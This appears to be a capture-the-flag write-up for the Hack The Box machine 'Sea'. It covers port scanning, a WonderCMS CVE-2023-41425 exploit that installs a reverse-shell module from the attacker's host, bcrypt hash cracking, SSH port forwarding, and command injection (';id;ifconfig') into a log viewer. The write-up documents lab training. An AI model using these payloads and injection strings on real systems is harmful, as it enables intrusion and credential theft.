# Hack the Box - "Sea" - 10.10.11.28
# Enumeration
## Nmap
### Inital Scan
Command
```
nmap -A -vv -oA enum/nmap-initial 10.10.11.28
```

Output
```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCZDkHH698ON6uxM3eFCVttoRXc1PMUSj8hDaiwlDlii0p8K8+6UOqhJno4Iti+VlIcHEc2THRsyhFdWAygICYaNoPsJ0nhkZsLkFyu/lmW7frIwINgdNXJOLnVSMWEdBWvVU7owy+9jpdm4AHAj6mu8vcPiuJ39YwBInzuCEhbNPncrgvXB1J4dEsQQAO4+KVH+Q
Z5ZCVm1pjXTjsFcStBtakBMykgReUX9GQJ9Y2D2XcqVyLPxrT98rYy+n5fV5OE7+J9aiUHccdZVngsGC1CXbbCT2jBRByxEMn+Hl+GI/r6Wi0IEbSY4mdesq8IHBmzw1T24A74SLrPYS9UDGSxEdB5rU6P3t91rOR3CvWQ1pdCZwkwC4S+kT35v32L8TH08Sw4Iiq806D6L2sUNORrhKBa5jQ7kGsjygTf0uahQ+g9GN
TFkjLspjtTlZbJZCWsz2v0hG+fzDfKEpfC55/FhD5EDbwGKRfuL/YnZUPzywsheq1H7F0xTRTdr4w0At8=
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMMoxImb/cXq07mVspMdCWkVQUTq96f6rKz6j5qFBfFnBkdjc07QzVuwhYZ61PX1Dm/PsAKW0VJfw/mctYsMwjM=
|   256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHuXW9Vi0myIh6MhZ28W8FeJo0FRKNduQvcSzUAkWw7z
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Sea - Home
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 
```

### Full Scan
Command
```
nmap -A -vv -p- -oA enum/nmap-full 10.10.11.28
```

Output
```
PORT   STATE SERVICE REASON         VERSION                                
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                                             
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCZDkHH698ON6uxM3eFCVttoRXc1PMUSj8hDaiwlDlii0p8K8+6UOqhJno4Iti+VlIcHEc2THRsyhFdWAygICYaNoPsJ0nhkZsLkFyu/lmW7frIwINgdNXJOLnVSMWEdBWvVU7owy+9jpdm4AHAj6mu8vcPiuJ39YwBInzuCEhbNPncrgvXB1J4dEsQQAO4+KVH+Q
Z5ZCVm1pjXTjsFcStBtakBMykgReUX9GQJ9Y2D2XcqVyLPxrT98rYy+n5fV5OE7+J9aiUHccdZVngsGC1CXbbCT2jBRByxEMn+Hl+GI/r6Wi0IEbSY4mdesq8IHBmzw1T24A74SLrPYS9UDGSxEdB5rU6P3t91rOR3CvWQ1pdCZwkwC4S+kT35v32L8TH08Sw4Iiq806D6L2sUNORrhKBa5jQ7kGsjygTf0uahQ+g9GN
TFkjLspjtTlZbJZCWsz2v0hG+fzDfKEpfC55/FhD5EDbwGKRfuL/YnZUPzywsheq1H7F0xTRTdr4w0At8=
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMMoxImb/cXq07mVspMdCWkVQUTq96f6rKz6j5qFBfFnBkdjc07QzVuwhYZ61PX1Dm/PsAKW0VJfw/mctYsMwjM=
|   256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHuXW9Vi0myIh6MhZ28W8FeJo0FRKNduQvcSzUAkWw7z
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags:                                       
|   /:                                                     
|     PHPSESSID:                                           
|_      httponly flag not set                              
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Sea - Home                                   
| http-methods:                                            
|_  Supported Methods: GET HEAD POST OPTIONS
```

## Port 80
### Nikto
Command
```
nikto -h http://10.10.11.28 -o nikto.txt
```

Output
```
- Nikto v2.5.0/
+ Target Host: sea.htb
+ Target Port: 80
+ GET /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options: 
+ GET /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/: 
+ GET /: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies: 
+ HEAD Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ LTBHEKIK /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ GET /home/: This might be interesting.
```

### dirsearch
Command
```
dirsearch -u http://sea.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 401,402,403 -F -o dirsearch.txt
```

Output
```

```
 
---

# Vulnerabilities
>Page source shows this theme "[http://sea.htb/themes/bike/css/style.css](view-source:http://sea.htb/themes/bike/css/style.css)"
>Found the README file for the theme(http://sea.htb/themes/bike/README.md):\
![[Pasted image 20240821201237.png]]
>Found the Version of the Theme(http://sea.htb/themes/bike/version) 3.2.0

>Found CVE-2023-41425 vulnerability for the WonderCMS Theme(https://gist.github.com/prodigiousMind/fc69a79629c4ba9ee88a7ad526043413)
You will need to alter the exploit to download from your machine on "var urlRev =" since HTB does not allow for internet connections.
Here is the code I used
```
var urlRev = "http://sea.htb/wondercms/?installModule=http://{{IP:PORT}}/revshell-main.zip&directoryName=violet&type=themes&token=" + token;
```

>Next go to on the website:
`http://sea.htb/themes/revshell-main/rev.php?lhost={{IP}}&lport={{{PORT}}`

>Reverse Shell established
![[Pasted image 20240821205443.png]]
---

# Privilege Escalation
## User
Password found ($2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q)
Cracked with hashcat
```
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```
![[Pasted image 20240822143656.png]]
`$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:mychemicalromance`

Able to ssh login to the amay user with that password.

## Root

Devices is running port 8080 on the localhost.
![[Pasted image 20240904162158.png]]

Set port forwarding on the device to attacking machine:
```
ssh -L 8888:localhost:8080 amay@sea.htb
```

Navigated to the page `localhost:8888` and received a new login screen. I was able to login to the prompt with amay:{{password}}. This provided a System Monitor page.
![[Pasted image 20240904162533.png]]

Analyzed the auth.log and noticed it is pulling from /var/log/auth.log
![[Pasted image 20240904162745.png]]

Ran the traffic through Burp Suite and altered to read a root file, however, it did not provide the details in the file:
![[Pasted image 20240904163451.png]]

Added ";id;ifconfig;{anything}" to the command and received the response with the file contents.
![[Pasted image 20240904164226.png]]
![[Pasted image 20240904164248.png]]

---

# Loot
## User
Command
```
ifconfig;id;hostname;cat user.txt
```
>ba1fb52ba64c73cbfe806774fb71b9d7
![[Pasted image 20240822143937.png]]

## Root/Admin
Command
```
/root/root.txt;id;ifconfig;end
```
>ac043af78a64b538e07aaf736e29d02f
